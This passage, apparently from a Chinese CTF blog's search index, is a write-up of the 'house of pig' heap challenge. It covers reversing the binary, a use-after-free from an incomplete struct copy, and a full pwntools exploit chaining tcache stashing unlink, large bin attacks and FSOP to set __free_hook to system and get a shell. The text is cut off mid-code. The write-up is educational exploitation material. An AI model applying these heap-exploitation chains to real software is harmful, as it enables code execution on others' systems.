\\    p64(0)+p64(0)+p64(open_addr)payload += p64(pop_rdi_addr)+p64(6)+p64(pop_rsi_r15_addr) + \\    p64(flag_addr)+p64(0)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(puts_addr)payload += b&#x27;/home/ctf/flag\\x00&#x27;give(payload)r.interactive()\n\n参考博客https://blog.csdn.net/getsum/article/details/104096038\n","categories":["pwn-xctf"],"tags":["/proc"]},{"title":"house of pig","url":"/2022/03/01/house-of-pig/","content":"在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。\nida恢复跳表首先看到main函数存在这样一句\n\n看不懂就直接看汇编。\n\n可以看出来其实这里是一个类似与switch的语句。只不过ida没有翻译过来。\n恢复的办法就是在IDA的edit当中的other里用Specify switch idiom\n\n\n\nAddress of Jump table：设置成 jump table 的地址\nNumber of elements：设置为 jump table 中存在的元素总数\nSize of table element：设置为 jump table 中元素的类型\nElement shift amount：这个一般情况下都是零，和跳表计算时的方式有关，比如此题只是单纯的跳表地址加跳表中的元素，那么就不需要移位\nElement base value：设置为计算跳转地址时给跳表元素加的值，比如此题的计算方法为 &amp;unk_69E0 + unk_69E0[i]，那么这里就应该填跳表的地址\nStart of the switch idiom：这个默认就行，就是获取跳表值的语句的地址\nInput register of switch：设置为用于给跳表寻址的寄存器\nFirst(lowest) input value：就是 switch 的最小值了\nDefault jump address：也就是 default 的跳转位置，其实有时候可以不填，但是最好还是填上，这个一般在上方不远处的 cmp 指令附近，特征就是判断了输入，然后跳转到某个地址上，跳转的这个地址就是要填的值了\n\n\n以上是各参数的意义\n\n最终填写的结果是这样。\n\n最终呈现的结果是这样。\n在Glibc2.31下的FSOP在以前纯粹讲解FSOP的时候发现的问题是，在2.29时的_IO_str_overflow函数就没有了用变量当作函数来调用，但是源码中还存在这样一段代码：\nchar *new_buf;char *old_buf = fp-&gt;_IO_buf_base;size_t old_blen = _IO_blen (fp);size_t new_size = 2 * old_blen + 100;if (new_size &lt; old_blen)    return EOF;new_buf = malloc (new_size);if (new_buf == NULL)&#123;    /*\t  __ferror(fp) = 1; */    return EOF;&#125;if (old_buf)&#123;    memcpy (new_buf, old_buf, old_blen);    free (old_buf);    /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */    fp-&gt;_IO_buf_base = NULL;&#125;\n\n当中调用了malloc然后memcpy到堆上，最后free掉，这样对于只存在calloc的程序可以说是毁灭性的打击。具体在题目中演示\n流程分析题目依旧是菜单题，不同的是，题目是存在三个角色，每个角色在创建堆块和修改堆块时都是不一样的。\n在这里先把角色的结构体给大家：\nstruct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;\n\n这里是第一个角色Peppa的create\nunsigned __int64 __fastcall create_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  int v8; // [rsp+20h] [rbp-10h]  unsigned __int64 v9; // [rsp+28h] [rbp-8h]  v9 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 19 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 20 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 84) &lt;= 143 )      *(users + 84) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v8 = input_int();    if ( v8 &gt;= *(users + 84) &amp;&amp; v8 &lt;= 0x430 )    &#123;      *(users + 0x54) = v8;      *(a1 + 8LL * i) = calloc(1uLL, v8);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 0x30LL)) = v8;      *(a1 + i + 0x120) = 0;      *(a1 + i + 0x138) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      for ( j = 0; j &lt; v8 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v9;&#125;\n\n可以看到上面是让下一次创建的堆块必须大于或则等于上一次创建的，以及在后面的for循环里写入内容中间都会出现两行空白sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);。在第二个角色也就是Mummy，创建堆块的规则是一样的，不过写入内容是sub_2DBC((*(a1 + 8LL * i) + 48 * j + 16LL), 16LL);\n但是第三个角色有所区别：\nunsigned __int64 __fastcall create_3(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  int i; // [rsp+10h] [rbp-20h]  int j; // [rsp+14h] [rbp-1Ch]  int v10; // [rsp+18h] [rbp-18h]  _BYTE *v11; // [rsp+20h] [rbp-10h]  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 4 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 5 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 256) &lt;= 143 )      *(users + 256) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v10 = input_int();    if ( v10 &gt; 143 &amp;&amp; v10 &lt;= 0x440 )    &#123;      *(users + 256) = v10;      *(a1 + 8LL * i) = calloc(1uLL, v10);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 48LL)) = v10;      *(a1 + i + 288) = 0;      *(a1 + i + 312) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Daddy&#x27;s message: &quot;);      for ( j = 0; j &lt; v10 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      if ( i == 4 )      &#123;        v11 = calloc(1uLL, 0xE8uLL);        v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;01dwang&#x27;s Gift:&quot;);        std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        sub_2D09(v11, 0xE8LL);        v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);        std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      &#125;    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v12;&#125;\n\n可以看到这里虽然是记录了上一个chunk的size但是并没有让后面的chunk的size必须大于等于上一个的。而且这里输入内容是这样的sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);\n通过上面可以看到peppa能够创建20个chunk，但是mummy只能创建10个chunk，最后的daddy只能创建5个chunk，并且最后一个chunk还是固定大小但是可以连续的写入内容。另外三个角色创建的最大chunk的size分别为：0x430，0x450，0x440 并且可以看到上面只存在calloc来申请chunk\n三个的show函数都挺类似：\nunsigned __int64 __fastcall show_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; *(a1 + 4 * (v4 + 48LL)) &amp;&amp; !*(a1 + v4 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;The message is: &quot;);      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, *(a1 + 8LL * v4));      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到show函数只是验证了，chunk_arr不为空，chunk_size不为空，并且chunk_exist==0\n再看edit函数：\nunsigned __int64 __fastcall edit_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int i; // [rsp+18h] [rbp-18h]  int v5; // [rsp+1Ch] [rbp-14h]  int v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v5 = input_int();  if ( v5 &gt;= 0 &amp;&amp; v5 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v5) &amp;&amp; *(a1 + 4 * (v5 + 48LL)) &amp;&amp; !*(a1 + v5 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      v6 = *(a1 + 4 * (v5 + 48LL)) / 48;      for ( i = 0; i &lt; v6 &amp;&amp; !sub_2DBC((*(a1 + 8LL * v5) + 48 * i), 16LL); ++i )        ;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v7;&#125;\n\n这是peppa的edit函数，这里的输入方式其实和再创建chunk的时候是一样的，并且验证的方式和show函数一样。\n最后就是delete函数：\nunsigned __int64 __fastcall delete_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; !*(a1 + v4 + 288) &amp;&amp; !*(a1 + v4 + 312) )    &#123;      free(*(a1 + 8LL * v4));      *(a1 + v4 + 288) = 1;      *(a1 + v4 + 312) = 1;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到这里验证就是chunk_arr不为空，chunk_exist==0，chunk_freed==0，free之后将后面两个置为1。\n在最后的更换身份的时候需要先验证密码：\n__int64 check_pass()&#123;  __int64 v0; // rax  __int64 v2; // rax  __int64 v3; // rax  unsigned int v4; // [rsp+Ch] [rbp-114h]  _DWORD v5[24]; // [rsp+10h] [rbp-110h] BYREF  char s[80]; // [rsp+70h] [rbp-B0h] BYREF  char v7[88]; // [rsp+C0h] [rbp-60h] BYREF  unsigned __int64 v8; // [rsp+118h] [rbp-8h]  v8 = __readfsqword(0x28u);  v0 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;Please enter the identity password of the corresponding user:&quot;);  std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  memset(s, 0, sizeof(s));  memset(v7, 0, 0x50uLL);  sub_2D09(s, 64LL);  v4 = strlen(s);  if ( !v4 )  &#123;    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;What&#x27;s this?&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  &#125;  ((&amp;sub_13C8 + 1))();  sub_2916(v5, s, v4);  sub_2A8B(v5, v7);  if ( !memcmp(v7, &amp;unk_6906, 0x11uLL) || !memcmp(v7, &amp;unk_6917, 0x11uLL) || !strcmp(v7, &quot;&lt;D&quot;) )  &#123;    if ( s[0] == 0x43 )      return 3LL;    if ( s[0] - 0x41 &lt;= 2 )    &#123;      if ( s[0] == 0x41 )        return 1LL;      if ( s[0] == 0x42 )        return 2LL;    &#125;  &#125;  v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Couldn&#x27;t find this password!&quot;);  std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  return 0LL;&#125;\n\n这里s为我们输入的内容，v7为经过md5加密之后的内容，所以只要满足md5之后以’&lt;D’开头即可进入下面\n&#123;    &quot;Peppa&quot;: &quot;A\\x01\\x95\\xc9\\x1c&quot;,    &quot;Mummy&quot;: &quot;B\\x01\\x87\\xc3\\x19&quot;,    &quot;Daddy&quot;: &quot;C\\x01\\xf7\\x3c\\x32&quot;&#125;\t\n\n根据将角色状态复制给变量的过程可以看出来包括所有角色的结构体其实是：\nstruct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;\n\n将all_pig的内容给pig的内容的过程是：\nunsigned __int64 __fastcall sub_3BEC(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(a1, users, 0xC0uLL);  memcpy((a1 + 0xC0), users + 0xC0, 0x60uLL);  memcpy((a1 + 0x120), users + 0x120, 0x18uLL);  memcpy((a1 + 0x138), users + 0x138, 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到是将结构体的每一部分都给到了单个pig，但是在切换角色时储存单个pig的函数：\nunsigned __int64 __fastcall sub_3B3E(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(users, a1, 0xC0uLL);  memcpy(users + 192, (a1 + 192), 0x60uLL);  memcpy(users + 312, (a1 + 312), 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到这里出现了问题，他并没有将chunk_exist赋值过去，所以就造成了UAF漏洞。\n利用分析利用思路其实就是首先泄漏出libc地址，接着泄漏heap地址，利用tcache stashing unlink attack+和large bin attack实现在free_hook附近分配chunk，但是由于calloc不能够直接申请tcache当中的chunk，所以我们需要第二次利用large bin attack修改掉_IO_list_all，并且这里写入的堆地址必须是第三个用户的堆地址，这里我们再改变_chain到我们最后的gift堆块，最后在gift堆块伪造_IO_FILE结构体。\n泄漏libc地址&amp;heap地址create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))\n\n为tcache stashing unlink attack做准备change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))\n\n第一次large bin attackcreate(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0\n\n第二次large bin attackchange(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2\n\n修改_chain的指向payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3\n\n伪造IO_FILE结构def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])\n\n这里解释一下为什么这么构造，把源码扒过来：\nint_IO_str_overflow (FILE *fp, int c)&#123;  int flush_only = c == EOF;  size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    &#125;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))    &#123;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\treturn EOF;      else\t&#123;\t  char *new_buf;\t  char *old_buf = fp-&gt;_IO_buf_base;\t  size_t old_blen = _IO_blen (fp);\t  size_t new_size = 2 * old_blen + 100;\t  if (new_size &lt; old_blen)\t    return EOF;\t  new_buf = malloc (new_size);\t  if (new_buf == NULL)\t    &#123;\t      /*\t  __ferror(fp) = 1; */\t      return EOF;\t    &#125;\t  if (old_buf)\t    &#123;\t      memcpy (new_buf, old_buf, old_blen);\t      free (old_buf);\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\t      fp-&gt;_IO_buf_base = NULL;\t    &#125;\t......&#125;\n\n#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)\n\n可以看到这里的old_buf也就是fp-&gt;_IO_buf_base然后old_blen也可以看到上面的定义，所以我们需要构造两个差值为0x18，并且我们可以看到，我们复制的内容也是从old_buf开始的，然后我们分配的tcahce其实是需要写三个p64才能修改到free_hook。\n\n我们这里的思路其实就是修改free_hook为system，那么我们free的时候就需要参数为/bin/sh所以我们old_buf就这样确定了，所以在构造结构体时后面跟了两个p64(system)这里和前面的不一样。\n所以综上得出，expfrom pwn import *elf = ELF(&#x27;./pig&#x27;)r = process(&#x27;./pig&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;&#x27;&#x27;&#x27;struct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;struct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;password&#123;    Peppa: A\\x01\\x95\\xc9\\x1c    Mummy: B\\x01\\x87\\xc3\\x19    Daddy: C\\x01\\xf7\\x3c\\x32&#125;&#x27;&#x27;&#x27;def create(size, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input the message size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def show(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def delete(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def change(role):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;Please enter the identity password of the corresponding user:&#x27;)    if role == 1:        r.sendline(b&#x27;A\\x01\\x95\\xc9\\x1c&#x27;)    elif role == 2:        r.sendline(b&#x27;B\\x01\\x87\\xc3\\x19&#x27;)    else:        r.sendline(b&#x27;C\\x01\\xf7\\x3c\\x32&#x27;)create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))create(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0# create(0x90, b&#x27;\\n&#x27;*3)  # C1change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)change(3)payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3create(0x90, b&#x27;\\n&#x27;*2)  # C4def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, 